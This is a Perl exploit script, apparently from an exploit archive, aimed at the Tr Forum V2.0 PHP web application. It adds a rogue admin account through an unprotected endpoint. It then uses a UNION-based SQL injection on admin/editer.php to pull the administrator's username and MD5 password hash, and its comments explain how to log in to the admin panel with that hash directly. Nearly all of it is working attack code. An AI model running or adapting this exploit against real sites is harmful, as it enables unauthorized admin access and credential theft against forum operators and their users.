Tr Forum 2.0 SQL Injection / Bypass Security Restriction Exploit
================================================================



#!/usr/bin/perl
#
# Affected.scr..: Tr Forum V2.0
# Poc.ID........: 10060903
# Type..........: SQL Injection, Bypass Security Restriction
# Risk.level....: Medium
# Vendor.Status.: Unpatched
# Src.download..: comscripts.com/scripts/php.tr-forum.1579.html
# Poc.link......: acid-root.new.fr/poc/10060903.txt
# Credits.......: DarkFig
#
# /membres/modif_profil.php => Profil modification (you can choose the id of the member)
# /membres/change_mdp.php   => Password modification ( same... )
# /admin/insert_admin.php   => Second admin (only del post)
# /admin/editer.php         => SQL Injection without quote
#
# You don&#039;t need to crack passwd hashes (for the admin panel)...
# Go to the admin panel (/admin/), enter the username and the hash (not the passwd)... bad security =(
# This exploit is FOR EDUCATIONAL PURPOSE ONLY x 999
#
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common "POST";
use HTTP::Response;
use Getopt::Long;
use strict;

print STDOUT "\n+", &#039;-&#039; x 53, "+\n";
print STDOUT "|    Tr Forum V2.0 Admin MD5 Passwd Hash Disclosure   |\n";
print STDOUT &#039;+&#039;, &#039;-&#039; x 53, "+\n";

my($host,$path,$proxh,$proxu,$proxp);
my $opt = GetOptions(
   &#039;host=s&#039;   =>  \$host,
   &#039;path=s&#039;   =>  \$path,
   &#039;proxh=s&#039;  =>  \$proxh,
   &#039;proxu=s&#039;  =>  \$proxu,
   &#039;proxp=s&#039;  =>  \$proxp);

if(!$host) {
    print STDOUT "| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\n";
    print STDOUT "| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\n";
    print STDOUT &#039;+&#039;, &#039;-&#039; x 53, "+\n";
    exit(0);
}

if($host  !~ /http/) {$host = &#039;http://&#039;.$host;}
if($proxh !~ /http/ && $proxh != &#039;&#039;) {$proxh = &#039;http://&#039;.$proxh.&#039;/&#039;;}
if(!$path) {$path = &#039;/&#039;;}

print STDOUT " [!]Host..: $host\n";
print STDOUT " [!]Path..: $path\n";
print STDOUT " [~]Admin user...\n";
sleep(1);

my $cc = HTTP::Cookies->new();
my $ua = LWP::UserAgent->new();
   $ua->cookie_jar($cc);
   $ua->agent(&#039;0xzilla&#039;);
   $ua->timeout(30);
   $ua->proxy([&#039;http&#039;] => $proxh) if $proxh;

my $re = POST $host.$path.&#039;/admin/insert_admin.php&#039;,[
         &#039;login&#039;    => &#039;AcidSploitWasHere&#039;,
         &#039;password&#039; => &#039;psychopasswd&#039;,
         &#039;mail&#039;     => &#039;nospam@bot.com&#039;,
         ];
   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;
   $ua->request($re);

print STDOUT " [+]User..: AcidSploitWasHere\n";
print STDOUT " [+]Pass..: psychopasswd\n";
print STDOUT " [!]Rights: 2 (medium)\n";
print STDOUT " [~]Collecting admin&#039;s hash/username...\n";
sleep(1);

my $re = POST $host.$path.&#039;index.php&#039;,[
         &#039;login&#039;   => &#039;AcidSploitWasHere&#039;,
         &#039;pwd&#039;     => &#039;psychopasswd&#039;,
        ];
   $ua->request($re);

my $re = $ua->get($host.$path.&#039;admin/editer.php?id2=-1 UNION SELECT pass,pseudo,0 FROM tr_user_forum&#039;);

if($re->content =~ /">([a-z0-9]{32})<\/font>/) {
                print STDOUT "\n ".$1.&#039;::&#039;;}

if($re->content =~ /;">(.*?)<\/textarea>/) {
                print STDOUT $1.&#039; (root)&#039;;}

print STDOUT "\n+", &#039;-&#039; x 53, "+\n";
exit(0);




